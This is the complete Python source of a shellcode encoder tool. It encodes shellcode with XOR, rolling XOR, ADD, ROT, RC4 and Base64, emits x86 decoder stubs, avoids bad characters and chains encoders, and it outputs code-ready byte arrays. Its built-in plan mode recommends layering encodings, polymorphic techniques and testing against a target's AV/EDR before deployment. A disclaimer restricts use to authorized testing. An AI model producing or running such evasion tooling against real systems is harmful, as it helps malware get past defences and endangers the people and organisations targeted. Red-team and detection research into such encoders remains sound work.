#!/usr/bin/env python3
"""
Shellcode Encoder
Encode shellcode using various techniques to evade signature detection

DISCLAIMER: This tool is for authorized security testing and educational purposes only.
Creating or deploying malicious shellcode without authorization is illegal.
"""

import argparse
import sys
import json
import os
import random
import struct
from typing import Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum, auto
from abc import ABC, abstractmethod
import base64
import hashlib


class EncodingType(Enum):
    """Available encoding types"""
    XOR = "xor"
    XOR_ROLLING = "xor_rolling"
    ADD = "add"
    SUB = "sub"
    ROT = "rot"
    BASE64 = "base64"
    AES = "aes"
    RC4 = "rc4"
    CUSTOM = "custom"
    CHAIN = "chain"


class OutputFormat(Enum):
    """Output format options"""
    RAW = "raw"
    C_ARRAY = "c_array"
    PYTHON = "python"
    POWERSHELL = "powershell"
    CSHARP = "csharp"
    HEX = "hex"


@dataclass
class EncoderConfig:
    """Configuration for encoding operation"""
    encoding_type: EncodingType
    key: Optional[bytes] = None
    iterations: int = 1
    output_format: OutputFormat = OutputFormat.RAW
    null_free: bool = True
    bad_chars: bytes = b'\x00\x0a\x0d'
    generate_decoder: bool = True


@dataclass
class EncodingResult:
    """Result of encoding operation"""
    encoded_shellcode: bytes
    decoder_stub: str
    key_used: bytes
    encoding_type: str
    iterations: int
    original_size: int
    encoded_size: int
    null_free: bool
    metadata: Dict = field(default_factory=dict)


class ShellcodeEncoder(ABC):
    """Abstract base class for shellcode encoders"""

    @abstractmethod
    def encode(self, shellcode: bytes, key: bytes) -> bytes:
        """Encode the shellcode"""
        pass

    @abstractmethod
    def get_decoder_stub(self, key: bytes, encoded_len: int) -> str:
        """Get decoder stub for this encoding"""
        pass

    @abstractmethod
    def get_name(self) -> str:
        """Get encoder name"""
        pass


class XOREncoder(ShellcodeEncoder):
    """Simple XOR encoder"""

    def encode(self, shellcode: bytes, key: bytes) -> bytes:
        """XOR encode shellcode with key"""
        encoded = bytearray()
        key_len = len(key)
        for i, byte in enumerate(shellcode):
            encoded.append(byte ^ key[i % key_len])
        return bytes(encoded)

    def get_decoder_stub(self, key: bytes, encoded_len: int) -> str:
        """Generate XOR decoder stub (x86)"""
        key_hex = key.hex()
        return f'''
; XOR Decoder Stub (x86)
; Key: 0x{key_hex}
; Length: {encoded_len} bytes

decoder:
    jmp short get_shellcode
decode_routine:
    pop esi                     ; Get shellcode address
    xor ecx, ecx
    mov cl, {encoded_len}       ; Shellcode length
decode_loop:
    xor byte [esi], 0x{key_hex} ; XOR with key
    inc esi
    loop decode_loop
    jmp short shellcode
get_shellcode:
    call decode_routine
shellcode:
    ; Encoded shellcode follows
'''

    def get_name(self) -> str:
        return "XOR"


class RollingXOREncoder(ShellcodeEncoder):
    """Rolling XOR encoder with changing key"""

    def encode(self, shellcode: bytes, key: bytes) -> bytes:
        """Rolling XOR encode - each byte affects next key"""
        encoded = bytearray()
        current_key = key[0]
        for byte in shellcode:
            encoded_byte = byte ^ current_key
            encoded.append(encoded_byte)
            current_key = (current_key + byte) & 0xFF
        return bytes(encoded)

    def get_decoder_stub(self, key: bytes, encoded_len: int) -> str:
        """Generate rolling XOR decoder stub"""
        return f'''
; Rolling XOR Decoder Stub (x86)
; Initial Key: 0x{key[0]:02x}
; Length: {encoded_len} bytes

decoder:
    jmp short get_shellcode
decode_routine:
    pop esi                     ; Get shellcode address
    xor ecx, ecx
    mov cl, {encoded_len}       ; Shellcode length
    mov bl, 0x{key[0]:02x}      ; Initial key
decode_loop:
    mov al, byte [esi]          ; Get encoded byte
    xor al, bl                  ; Decode
    add bl, al                  ; Update key with decoded byte
    mov byte [esi], al          ; Store decoded
    inc esi
    loop decode_loop
    jmp short shellcode
get_shellcode:
    call decode_routine
shellcode:
    ; Encoded shellcode follows
'''

    def get_name(self) -> str:
        return "Rolling XOR"


class ADDEncoder(ShellcodeEncoder):
    """ADD encoder - adds key value to each byte"""

    def encode(self, shellcode: bytes, key: bytes) -> bytes:
        """ADD encode shellcode"""
        encoded = bytearray()
        key_val = key[0]
        for byte in shellcode:
            encoded.append((byte + key_val) & 0xFF)
        return bytes(encoded)

    def get_decoder_stub(self, key: bytes, encoded_len: int) -> str:
        """Generate ADD decoder stub (SUB to decode)"""
        return f'''
; ADD Encoder Decoder Stub (x86)
; Key: 0x{key[0]:02x}
; Length: {encoded_len} bytes

decoder:
    jmp short get_shellcode
decode_routine:
    pop esi                     ; Get shellcode address
    xor ecx, ecx
    mov cl, {encoded_len}       ; Shellcode length
decode_loop:
    sub byte [esi], 0x{key[0]:02x} ; SUB to decode
    inc esi
    loop decode_loop
    jmp short shellcode
get_shellcode:
    call decode_routine
shellcode:
    ; Encoded shellcode follows
'''

    def get_name(self) -> str:
        return "ADD"


class ROTEncoder(ShellcodeEncoder):
    """ROT/Caesar cipher encoder"""

    def encode(self, shellcode: bytes, key: bytes) -> bytes:
        """ROT encode shellcode"""
        encoded = bytearray()
        rotation = key[0]
        for byte in shellcode:
            encoded.append((byte + rotation) % 256)
        return bytes(encoded)

    def get_decoder_stub(self, key: bytes, encoded_len: int) -> str:
        """Generate ROT decoder stub"""
        return f'''
; ROT Decoder Stub (x86)
; Rotation: {key[0]}
; Length: {encoded_len} bytes

decoder:
    jmp short get_shellcode
decode_routine:
    pop esi                     ; Get shellcode address
    xor ecx, ecx
    mov cl, {encoded_len}       ; Shellcode length
decode_loop:
    mov al, byte [esi]
    sub al, {key[0]}            ; Reverse rotation
    mov byte [esi], al
    inc esi
    loop decode_loop
    jmp short shellcode
get_shellcode:
    call decode_routine
shellcode:
    ; Encoded shellcode follows
'''

    def get_name(self) -> str:
        return "ROT"


class RC4Encoder(ShellcodeEncoder):
    """RC4 stream cipher encoder"""

    def _rc4_init(self, key: bytes) -> List[int]:
        """Initialize RC4 S-box"""
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        return S

    def _rc4_crypt(self, data: bytes, key: bytes) -> bytes:
        """RC4 encrypt/decrypt"""
        S = self._rc4_init(key)
        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)
        return bytes(result)

    def encode(self, shellcode: bytes, key: bytes) -> bytes:
        """RC4 encode shellcode"""
        return self._rc4_crypt(shellcode, key)

    def get_decoder_stub(self, key: bytes, encoded_len: int) -> str:
        """Generate RC4 decoder description"""
        return f'''
; RC4 Decoder (Pseudocode)
; Key: {key.hex()}
; Key Length: {len(key)} bytes
; Encoded Length: {encoded_len} bytes

; Note: RC4 decryption is same as encryption
; Use the same key to decode

; Python decoder:
def rc4_decode(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    return bytes(result)
'''

    def get_name(self) -> str:
        return "RC4"


class Base64Encoder(ShellcodeEncoder):
    """Base64 encoder with custom alphabet support"""

    def encode(self, shellcode: bytes, key: bytes) -> bytes:
        """Base64 encode shellcode"""
        return base64.b64encode(shellcode)

    def get_decoder_stub(self, key: bytes, encoded_len: int) -> str:
        """Generate Base64 decoder stub"""
        return '''
# Base64 Decoder (PowerShell)
$encoded = "<base64_shellcode_here>"
$decoded = [System.Convert]::FromBase64String($encoded)

# Base64 Decoder (Python)
import base64
decoded = base64.b64decode(encoded)

# Base64 Decoder (C#)
byte[] decoded = Convert.FromBase64String(encoded);
'''

    def get_name(self) -> str:
        return "Base64"


class ShellcodeEncoderTool:
    """Main shellcode encoder tool"""

    def __init__(self):
        self.encoders: Dict[EncodingType, ShellcodeEncoder] = {
            EncodingType.XOR: XOREncoder(),
            EncodingType.XOR_ROLLING: RollingXOREncoder(),
            EncodingType.ADD: ADDEncoder(),
            EncodingType.ROT: ROTEncoder(),
            EncodingType.RC4: RC4Encoder(),
            EncodingType.BASE64: Base64Encoder(),
        }

    def get_available_encoders(self) -> List[str]:
        """Get list of available encoders"""
        return [e.value for e in self.encoders.keys()]

    def generate_key(self, length: int = 1, avoid_bytes: bytes = b'\x00') -> bytes:
        """Generate random key avoiding specified bytes"""
        key = bytearray()
        while len(key) < length:
            byte = random.randint(1, 255)
            if byte not in avoid_bytes:
                key.append(byte)
        return bytes(key)

    def find_good_key(self, shellcode: bytes, encoder: ShellcodeEncoder,
                      bad_chars: bytes = b'\x00\x0a\x0d',
                      max_attempts: int = 256) -> Optional[bytes]:
        """Find a key that produces output without bad characters"""
        for _ in range(max_attempts):
            key = self.generate_key(1, bad_chars)
            encoded = encoder.encode(shellcode, key)
            if not any(b in encoded for b in bad_chars):
                return key
        return None

    def format_output(self, shellcode: bytes, fmt: OutputFormat, var_name: str = "shellcode") -> str:
        """Format shellcode for different languages"""
        if fmt == OutputFormat.RAW:
            return shellcode.hex()

        elif fmt == OutputFormat.HEX:
            return ''.join(f'\\x{b:02x}' for b in shellcode)

        elif fmt == OutputFormat.C_ARRAY:
            hex_bytes = ', '.join(f'0x{b:02x}' for b in shellcode)
            return f'unsigned char {var_name}[] = {{ {hex_bytes} }};'

        elif fmt == OutputFormat.PYTHON:
            hex_str = ''.join(f'\\x{b:02x}' for b in shellcode)
            return f'{var_name} = b"{hex_str}"'

        elif fmt == OutputFormat.POWERSHELL:
            hex_bytes = ','.join(f'0x{b:02x}' for b in shellcode)
            return f'[Byte[]] ${var_name} = @({hex_bytes})'

        elif fmt == OutputFormat.CSHARP:
            hex_bytes = ', '.join(f'0x{b:02x}' for b in shellcode)
            return f'byte[] {var_name} = new byte[] {{ {hex_bytes} }};'

        return shellcode.hex()

    def encode(self, shellcode: bytes, config: EncoderConfig) -> EncodingResult:
        """Encode shellcode with specified configuration"""
        if config.encoding_type not in self.encoders:
            raise ValueError(f"Unknown encoder: {config.encoding_type}")

        encoder = self.encoders[config.encoding_type]
        original_size = len(shellcode)

        # Generate or use provided key
        if config.key:
            key = config.key
        else:
            if config.null_free:
                key = self.find_good_key(shellcode, encoder, config.bad_chars)
                if key is None:
                    # Fallback to random key
                    key = self.generate_key(1, config.bad_chars)
            else:
                key = self.generate_key(1)

        # Apply encoding iterations
        encoded = shellcode
        for _ in range(config.iterations):
            encoded = encoder.encode(encoded, key)

        # Check for bad characters
        null_free = not any(b in encoded for b in config.bad_chars)

        # Get decoder stub
        decoder_stub = ""
        if config.generate_decoder:
            decoder_stub = encoder.get_decoder_stub(key, len(encoded))

        return EncodingResult(
            encoded_shellcode=encoded,
            decoder_stub=decoder_stub,
            key_used=key,
            encoding_type=encoder.get_name(),
            iterations=config.iterations,
            original_size=original_size,
            encoded_size=len(encoded),
            null_free=null_free,
            metadata={
                "encoder": config.encoding_type.value,
                "bad_chars_avoided": config.bad_chars.hex()
            }
        )

    def chain_encode(self, shellcode: bytes, encodings: List[EncodingType],
                     keys: Optional[List[bytes]] = None) -> Tuple[bytes, List[Dict]]:
        """Apply multiple encodings in sequence"""
        current = shellcode
        chain_info = []

        for i, encoding in enumerate(encodings):
            key = keys[i] if keys and i < len(keys) else None
            config = EncoderConfig(
                encoding_type=encoding,
                key=key,
                iterations=1,
                generate_decoder=False
            )
            result = self.encode(current, config)
            current = result.encoded_shellcode
            chain_info.append({
                "step": i + 1,
                "encoder": encoding.value,
                "key": result.key_used.hex(),
                "size": len(current)
            })

        return current, chain_info

    def plan(self, shellcode_source: str, config: EncoderConfig) -> str:
        """Generate execution plan without encoding"""
        output = []
        output.append("")
        output.append("[PLAN MODE] Tool: shellcode-encoder")
        output.append("=" * 60)
        output.append("")
        output.append("DISCLAIMER: For authorized security testing only.")
        output.append("")
        output.append("-" * 60)
        output.append("Configuration:")
        output.append("-" * 60)
        output.append(f"  Shellcode Source: {shellcode_source}")
        output.append(f"  Encoding Type: {config.encoding_type.value}")
        output.append(f"  Iterations: {config.iterations}")
        output.append(f"  Output Format: {config.output_format.value}")
        output.append(f"  Null-Free: {'Required' if config.null_free else 'Not required'}")
        output.append(f"  Bad Characters: {config.bad_chars.hex()}")
        output.append(f"  Generate Decoder: {'Yes' if config.generate_decoder else 'No'}")

        if config.key:
            output.append(f"  Key (provided): {config.key.hex()}")
        else:
            output.append("  Key: Will be auto-generated")

        output.append("")
        output.append("-" * 60)
        output.append("Actions to be performed:")
        output.append("-" * 60)
        output.append("  1. Load shellcode from source")
        output.append(f"  2. Initialize {config.encoding_type.value} encoder")

        if not config.key:
            if config.null_free:
                output.append("  3. Generate key avoiding bad characters")
            else:
                output.append("  3. Generate random key")

        output.append(f"  4. Apply encoding ({config.iterations} iteration(s))")

        if config.null_free:
            output.append("  5. Verify no bad characters in output")

        if config.generate_decoder:
            output.append("  6. Generate decoder stub")

        output.append(f"  7. Format output as {config.output_format.value}")
        output.append("")

        if config.encoding_type in self.encoders:
            encoder = self.encoders[config.encoding_type]
            output.append("-" * 60)
            output.append(f"Encoder Details: {encoder.get_name()}")
            output.append("-" * 60)

        output.append("")
        output.append("-" * 60)
        output.append("Detection Considerations:")
        output.append("-" * 60)
        output.append("  ! Encoded patterns may still be detectable")
        output.append("  ! Decoder stub contains recognizable patterns")
        output.append("  ! Multiple encoding layers recommended")
        output.append("  ! Consider polymorphic techniques for advanced evasion")
        output.append("")
        output.append("-" * 60)
        output.append("Recommendations:")
        output.append("-" * 60)
        output.append("  - Use chain encoding for better evasion")
        output.append("  - Test against target AV/EDR before deployment")
        output.append("  - Combine with other obfuscation techniques")
        output.append("  - Consider custom encoder for unique signatures")
        output.append("")
        output.append("This is PLAN MODE - no encoding performed.")
        output.append("=" * 60)
        output.append("")

        return "\n".join(output)

    def analyze_shellcode(self, shellcode: bytes) -> Dict:
        """Analyze shellcode characteristics"""
        analysis = {
            "size": len(shellcode),
            "null_bytes": shellcode.count(b'\x00'),
            "newline_bytes": shellcode.count(b'\x0a') + shellcode.count(b'\x0d'),
            "entropy": self._calculate_entropy(shellcode),
            "byte_frequency": {},
            "potential_strings": []
        }

        # Byte frequency
        for byte in shellcode:
            analysis["byte_frequency"][byte] = analysis["byte_frequency"].get(byte, 0) + 1

        # Most common bytes
        sorted_freq = sorted(analysis["byte_frequency"].items(), key=lambda x: x[1], reverse=True)
        analysis["most_common_bytes"] = [(f"0x{k:02x}", v) for k, v in sorted_freq[:5]]

        return analysis

    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy of data"""
        if not data:
            return 0.0

        import math
        frequency = {}
        for byte in data:
            frequency[byte] = frequency.get(byte, 0) + 1

        entropy = 0.0
        for count in frequency.values():
            probability = count / len(data)
            entropy -= probability * math.log2(probability)

        return round(entropy, 4)


def get_documentation() -> Dict:
    """
    Documentation hook for integration with documentation agent.
    Returns structured documentation for this tool.
    """
    return {
        "name": "Shellcode Encoder",
        "version": "1.0.0",
        "category": "Evasion/Encoding",
        "description": "Encode shellcode using various techniques to evade signature-based detection.",
        "author": "Offensive Security Toolsmith",
        "disclaimer": "For authorized security testing only. Creating malicious shellcode is illegal.",
        "usage": {
            "basic": "python shellcode_encoder.py --input shellcode.bin --encoding xor",
            "with_key": "python shellcode_encoder.py --input sc.bin --encoding xor --key deadbeef",
            "chain": "python shellcode_encoder.py --input sc.bin --chain xor,add,rot",
            "plan": "python shellcode_encoder.py --input sc.bin --encoding rc4 --plan"
        },
        "encoders": [
            {"name": "xor", "description": "Simple XOR encoding"},
            {"name": "xor_rolling", "description": "Rolling XOR with changing key"},
            {"name": "add", "description": "ADD encoding (SUB to decode)"},
            {"name": "rot", "description": "ROT/Caesar cipher"},
            {"name": "rc4", "description": "RC4 stream cipher"},
            {"name": "base64", "description": "Base64 encoding"}
        ],
        "output_formats": ["raw", "c_array", "python", "powershell", "csharp", "hex"],
        "arguments": [
            {"name": "--input", "description": "Input shellcode file", "required": True},
            {"name": "--encoding", "description": "Encoding type to use", "required": False},
            {"name": "--key", "description": "Encryption key (hex)", "required": False},
            {"name": "--iterations", "description": "Number of encoding passes", "required": False},
            {"name": "--format", "description": "Output format", "required": False},
            {"name": "--chain", "description": "Chain multiple encoders", "required": False},
            {"name": "--null-free", "description": "Ensure no null bytes", "required": False},
            {"name": "--bad-chars", "description": "Characters to avoid (hex)", "required": False},
            {"name": "--analyze", "description": "Analyze shellcode", "required": False},
            {"name": "--plan", "description": "Show execution plan only", "required": False}
        ],
        "references": [
            "https://attack.mitre.org/techniques/T1027/",
            "https://www.offensive-security.com/metasploit-unleashed/msfvenom/"
        ]
    }


def main():
    parser = argparse.ArgumentParser(
        description="Shellcode Encoder - Evade signature detection",
        epilog="DISCLAIMER: For authorized security testing only."
    )

    parser.add_argument("--input", "-i", help="Input shellcode file or hex string")
    parser.add_argument("--encoding", "-e",
                        choices=["xor", "xor_rolling", "add", "rot", "rc4", "base64"],
                        help="Encoding type")
    parser.add_argument("--key", "-k", help="Encryption key (hex string)")
    parser.add_argument("--iterations", "-n", type=int, default=1,
                        help="Number of encoding iterations")
    parser.add_argument("--format", "-f",
                        choices=["raw", "c_array", "python", "powershell", "csharp", "hex"],
                        default="hex", help="Output format")
    parser.add_argument("--chain", help="Chain encoders (comma-separated)")
    parser.add_argument("--null-free", action="store_true",
                        help="Ensure null-free output")
    parser.add_argument("--bad-chars", default="000a0d",
                        help="Bad characters to avoid (hex)")
    parser.add_argument("--output", "-o", help="Output file")
    parser.add_argument("--analyze", "-a", action="store_true",
                        help="Analyze shellcode")
    parser.add_argument("--plan", "-p", action="store_true",
                        help="Show execution plan only")
    parser.add_argument("--list", "-l", action="store_true",
                        help="List available encoders")
    parser.add_argument("--json", "-j", action="store_true",
                        help="Output in JSON format")
    parser.add_argument("--doc", action="store_true",
                        help="Show documentation")

    args = parser.parse_args()
    tool = ShellcodeEncoderTool()

    # Handle documentation
    if args.doc:
        docs = get_documentation()
        if args.json:
            print(json.dumps(docs, indent=2))
        else:
            print(f"\n{docs['name']} v{docs['version']}")
            print("=" * 60)
            print(f"\n{docs['description']}\n")
            print("Available Encoders:")
            for enc in docs['encoders']:
                print(f"  - {enc['name']}: {enc['description']}")
        return 0

    # Handle list
    if args.list:
        encoders = tool.get_available_encoders()
        if args.json:
            print(json.dumps({"encoders": encoders}))
        else:
            print("\nAvailable Encoders:")
            print("-" * 30)
            for enc in encoders:
                print(f"  - {enc}")
        return 0

    # Require input for other operations
    if not args.input:
        parser.print_help()
        print("\nError: --input required")
        return 1

    # Load shellcode
    shellcode = None
    if os.path.isfile(args.input):
        with open(args.input, 'rb') as f:
            shellcode = f.read()
    else:
        # Assume hex string
        try:
            clean_hex = args.input.replace('\\x', '').replace(' ', '').replace('0x', '')
            shellcode = bytes.fromhex(clean_hex)
        except ValueError:
            print(f"Error: Cannot parse input as file or hex string", file=sys.stderr)
            return 1

    # Handle analysis
    if args.analyze:
        analysis = tool.analyze_shellcode(shellcode)
        if args.json:
            print(json.dumps(analysis, indent=2))
        else:
            print("\nShellcode Analysis:")
            print("-" * 40)
            print(f"  Size: {analysis['size']} bytes")
            print(f"  Null bytes: {analysis['null_bytes']}")
            print(f"  Newline bytes: {analysis['newline_bytes']}")
            print(f"  Entropy: {analysis['entropy']}")
            print("  Most common bytes:")
            for byte_hex, count in analysis['most_common_bytes']:
                print(f"    {byte_hex}: {count} occurrences")
        return 0

    # Parse configuration
    bad_chars = bytes.fromhex(args.bad_chars)
    key = bytes.fromhex(args.key) if args.key else None

    # Handle chain encoding
    if args.chain:
        encodings = [EncodingType(e.strip()) for e in args.chain.split(',')]

        if args.plan:
            print(f"\n[PLAN MODE] Chain Encoding")
            print(f"Encoders: {' -> '.join(e.value for e in encodings)}")
            print(f"Input size: {len(shellcode)} bytes")
            print("Would apply encodings in sequence...")
            return 0

        encoded, chain_info = tool.chain_encode(shellcode, encodings)
        formatted = tool.format_output(encoded, OutputFormat(args.format))

        if args.json:
            print(json.dumps({
                "encoded": encoded.hex(),
                "formatted": formatted,
                "chain": chain_info
            }, indent=2))
        else:
            print("\n" + "=" * 60)
            print("Chain Encoded Shellcode")
            print("=" * 60)
            for info in chain_info:
                print(f"  Step {info['step']}: {info['encoder']} (key: {info['key']}) -> {info['size']} bytes")
            print(f"\nFinal size: {len(encoded)} bytes")
            print("-" * 60)
            print(formatted)

        return 0

    # Single encoding
    if not args.encoding:
        args.encoding = "xor"  # Default

    encoding_type = EncodingType(args.encoding)
    config = EncoderConfig(
        encoding_type=encoding_type,
        key=key,
        iterations=args.iterations,
        output_format=OutputFormat(args.format),
        null_free=args.null_free,
        bad_chars=bad_chars,
        generate_decoder=True
    )

    # Handle plan mode
    if args.plan:
        print(tool.plan(args.input, config))
        return 0

    # Encode
    try:
        result = tool.encode(shellcode, config)
        formatted = tool.format_output(result.encoded_shellcode, config.output_format)

        if args.output:
            with open(args.output, 'wb') as f:
                f.write(result.encoded_shellcode)
            print(f"Encoded shellcode written to {args.output}")

        if args.json:
            output_data = {
                "encoded_hex": result.encoded_shellcode.hex(),
                "formatted": formatted,
                "key": result.key_used.hex(),
                "encoding": result.encoding_type,
                "iterations": result.iterations,
                "original_size": result.original_size,
                "encoded_size": result.encoded_size,
                "null_free": result.null_free,
                "decoder_stub": result.decoder_stub
            }
            print(json.dumps(output_data, indent=2))
        else:
            print("\n" + "=" * 60)
            print(f"Encoded Shellcode ({result.encoding_type})")
            print("=" * 60)
            print(f"  Original size: {result.original_size} bytes")
            print(f"  Encoded size: {result.encoded_size} bytes")
            print(f"  Key: {result.key_used.hex()}")
            print(f"  Iterations: {result.iterations}")
            print(f"  Null-free: {'Yes' if result.null_free else 'No'}")
            print("-" * 60)
            print("\nEncoded shellcode:")
            print(formatted)
            if result.decoder_stub:
                print("\n" + "-" * 60)
                print("Decoder Stub:")
                print(result.decoder_stub)

        return 0

    except ValueError as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
